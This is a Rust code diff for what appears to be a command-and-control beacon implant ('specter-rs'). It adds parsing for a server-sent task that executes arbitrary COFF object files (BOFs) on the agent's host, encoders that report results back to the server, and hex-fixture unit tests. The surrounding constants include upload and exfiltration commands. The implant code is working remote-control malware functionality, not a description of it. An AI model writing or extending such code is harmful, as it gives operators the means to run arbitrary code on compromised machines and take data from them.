@@ -131,6 +131,26 @@ pub const COMMAND_UPLOAD: u32 = 33;
 pub const COMMAND_EXFIL: u32 = 35;
 /// Server-side memory chunking of upload payloads (docs/WIRE.md).
 pub const COMMAND_SAVEMEMORY: u32 = 0x2321;
+/// BOF execution (native beacon_agent `execute bof`, pl_utils.go).
+pub const COMMAND_EXEC_BOF: u32 = 50;
+/// BOF output/error records (native COMMAND_EXEC_BOF_OUT).
+pub const COMMAND_EXEC_BOF_OUT: u32 = 51;
+
+/// COMMAND_EXEC_BOF result byte: async BOF started (Completed=false).
+pub const BOF_STATE_STARTED: u8 = 1;
+/// COMMAND_EXEC_BOF result byte: BOF finished (Completed=true).
+pub const BOF_STATE_FINISHED: u8 = 2;
+
+/// COMMAND_EXEC_BOF_OUT callback types (native pl_utils.go).
+pub const CALLBACK_ERROR: u32 = 0x0d;
+pub const CALLBACK_OUTPUT_OEM: u32 = 0x1e;
+pub const CALLBACK_OUTPUT_UTF8: u32 = 0x20;
+/// BOF load error types, reported through COMMAND_EXEC_BOF_OUT.
+pub const BOF_ERROR_PARSE: u32 = 0x101;
+pub const BOF_ERROR_SYMBOL: u32 = 0x102;
+pub const BOF_ERROR_MAX_FUNCS: u32 = 0x103;
+pub const BOF_ERROR_ENTRY: u32 = 0x104;
+pub const BOF_ERROR_ALLOC: u32 = 0x105;
 
 /// Download progress states (native pl_utils.go).
 pub const DOWNLOAD_START: u8 = 1;
@@ -390,6 +410,89 @@ pub fn parse_save_memory<'a>(r: &mut Reader<'a>) -> Option<(u32, usize, &'a [u8]
     let chunk = r.take(chunk_len)?;
     let _task_id = r.u32_le()?;
     Some((memory_id, expected, chunk))
+}
+
+/// One parsed `execute bof` task. The BOF image and its argument blob are
+/// borrowed from the response buffer — the task must be executed inline,
+/// like SAVEMEMORY, before the buffer is reused.
+pub struct BofTask<'a> {
+    /// `-a`: run detached (the beacon reports start, then runs it).
+    pub async_flag: bool,
+    /// Entry symbol name, NUL-stripped (`entry_len` bytes).
+    pub entry: [u8; 64],
+    pub entry_len: u16,
+    /// The COFF image bytes.
+    pub bof: &'a [u8],
+    /// The argument blob passed to the entry (`args ptr, argslen`).
+    pub args: &'a [u8],
+    pub task_id: u32,
+}
+
+impl BofTask<'_> {
+    pub fn entry_name(&self) -> &[u8] {
+        &self.entry[..self.entry_len as usize]
+    }
+}
+
+/// Parse one `execute bof` task record (the PackArray layout the server's
+/// CreateCommand emits: `{50, async byte, "go", len, bof, len, params}` as
+/// `[u32 LE 50 || u8 async || pack_string entry || u32 LE len || bof
+/// || u32 LE len || params || u32 LE taskId]`). The borrowed slices point
+/// into the reader's buffer — inline execution only.
+pub fn parse_exec_bof<'a>(r: &mut Reader<'a>) -> Option<BofTask<'a>> {
+    let command = r.u32_le()?;
+    if command != COMMAND_EXEC_BOF {
+        return None;
+    }
+    let async_flag = r.u8()? != 0;
+    // Entry name: pack_string semantics (u32 LE len incl. the NUL).
+    let len = r.u32_le()? as usize;
+    if len == 0 || len > 64 {
+        return None;
+    }
+    let bytes = r.take(len)?;
+    let mut entry = [0u8; 64];
+    let mut i = 0;
+    while i < bytes.len() {
+        entry[i] = bytes[i];
+        i += 1;
+    }
+    let mut n = bytes.len();
+    while n > 0 && entry[n - 1] == 0 {
+        n -= 1;
+    }
+    let entry_len = n as u16;
+    // BOF image: u32 LE length + bytes (PackArray `int len` + raw bytes).
+    let bof_len = r.u32_le()? as usize;
+    let bof = r.take(bof_len)?;
+    // Argument blob: same layout; the trailing NUL stays in the blob —
+    // BeaconData* length comes from the task, not the string form.
+    let args_len = r.u32_le()? as usize;
+    let args = r.take(args_len)?;
+    let task_id = r.u32_le()?;
+    Some(BofTask {
+        async_flag,
+        entry,
+        entry_len,
+        bof,
+        args,
+        task_id,
+    })
+}
+
+/// COMMAND_EXEC_BOF lifecycle record: `u32 BE taskId || u32 BE 50
+/// || u8 state` (1 = started, Completed=false; 2 = finished,
+/// Completed=true).
+pub fn push_bof_lifecycle(w: &mut Writer, task_id: u32, state: u8) -> bool {
+    push_result_header(w, task_id, COMMAND_EXEC_BOF) && w.u8(state)
+}
+
+/// COMMAND_EXEC_BOF_OUT record: `u32 BE taskId || u32 BE 51
+/// || u32 BE outputType || array output`. Error types carry the failing
+/// symbol name ("Symbol not found: X" server-side); callbacks carry the
+/// BOF's printed text.
+pub fn push_bof_output(w: &mut Writer, task_id: u32, output_type: u32, output: &[u8]) -> bool {
+    push_result_header(w, task_id, COMMAND_EXEC_BOF_OUT) && w.u32(output_type) && w.array(output)
 }
 
 /// DOWNLOAD progress record: `int fileId || byte state` then per state:
@@ -906,6 +1009,85 @@ mod tests {
         assert_eq!(expected, 10);
         assert_eq!(chunk, b"specter-rs");
         assert_eq!(r.remaining(), 0);
+    }
+
+    /// `execute bof` task from the native CreateCommand semantics
+    /// (PackArray: {50, bool, "go", int len, bytes, int len, bytes}).
+    #[test]
+    fn parse_exec_bof_from_native_reference() {
+        // async=true, entry "go", BOF bytes de ad be ef, params 41 42,
+        // taskId 7.
+        let bytes = hex("320000000103000000676f0004000000deadbeef02000000414207000000");
+        let mut r = Reader::new(&bytes);
+        let task = parse_exec_bof(&mut r).unwrap();
+        assert!(task.async_flag);
+        assert_eq!(task.entry_name(), b"go");
+        assert_eq!(task.bof, &[0xde, 0xad, 0xbe, 0xef]);
+        assert_eq!(task.args, b"AB");
+        assert_eq!(task.task_id, 7);
+        assert_eq!(r.remaining(), 0);
+
+        // Sync run, empty params, taskId 0x11223344.
+        let bytes = hex("320000000003000000676f0004000000deadbeef0000000044332211");
+        let mut r = Reader::new(&bytes);
+        let task = parse_exec_bof(&mut r).unwrap();
+        assert!(!task.async_flag);
+        assert!(task.args.is_empty());
+        assert_eq!(task.task_id, 0x1122_3344);
+    }
+
+    #[test]
+    fn parse_exec_bof_rejects_truncation_and_wrong_command() {
+        // Not COMMAND_EXEC_BOF: refused (the dispatcher peeks first).
+        let bytes = hex("210000000103000000676f00000000000000000");
+        let mut r = Reader::new(&bytes);
+        assert!(parse_exec_bof(&mut r).is_none());
+        // Truncated mid-image.
+        let bytes = hex("320000000103000000676f0004000000dead");
+        let mut r = Reader::new(&bytes);
+        assert!(parse_exec_bof(&mut r).is_none());
+        // Oversized entry name.
+        let bytes = hex("320000000141000000");
+        let mut r = Reader::new(&bytes);
+        assert!(parse_exec_bof(&mut r).is_none());
+    }
+
+    /// Lifecycle and output records against the native ProcessData layout
+    /// (`u32 BE taskId || u32 BE commandId || ...`).
+    #[test]
+    fn bof_records_match_native_processdata_layout() {
+        // Async started: taskId 0x11223344, state 1 (Completed=false).
+        let mut buf = [0u8; 64];
+        let mut w = Writer::new(&mut buf);
+        assert!(push_bof_lifecycle(&mut w, 0x1122_3344, BOF_STATE_STARTED));
+        let expected = hex("112233440000003201");
+        assert_eq!(w.written_bytes(), &expected[..]);
+
+        // Finished: state 2 (Completed=true).
+        let mut buf = [0u8; 64];
+        let mut w = Writer::new(&mut buf);
+        assert!(push_bof_lifecycle(&mut w, 0x1122_3344, BOF_STATE_FINISHED));
+        let expected = hex("112233440000003202");
+        assert_eq!(w.written_bytes(), &expected[..]);
+
+        // UTF8 output: taskId 1, type CALLBACK_OUTPUT_UTF8, array "hello".
+        let mut buf = [0u8; 64];
+        let mut w = Writer::new(&mut buf);
+        assert!(push_bof_output(&mut w, 1, CALLBACK_OUTPUT_UTF8, b"hello"));
+        let expected = hex("0000000100000033000000200000000568656c6c6f");
+        assert_eq!(w.written_bytes(), &expected[..]);
+
+        // Symbol error: taskId 2, type BOF_ERROR_SYMBOL, array "BeaconPrintf".
+        let mut buf = [0u8; 64];
+        let mut w = Writer::new(&mut buf);
+        assert!(push_bof_output(
+            &mut w,
+            2,
+            BOF_ERROR_SYMBOL,
+            b"BeaconPrintf"
+        ));
+        let expected = hex("0000000200000033000001020000000c426561636f6e5072696e7466");
+        assert_eq!(w.written_bytes(), &expected[..]);
     }
 
     #[test]
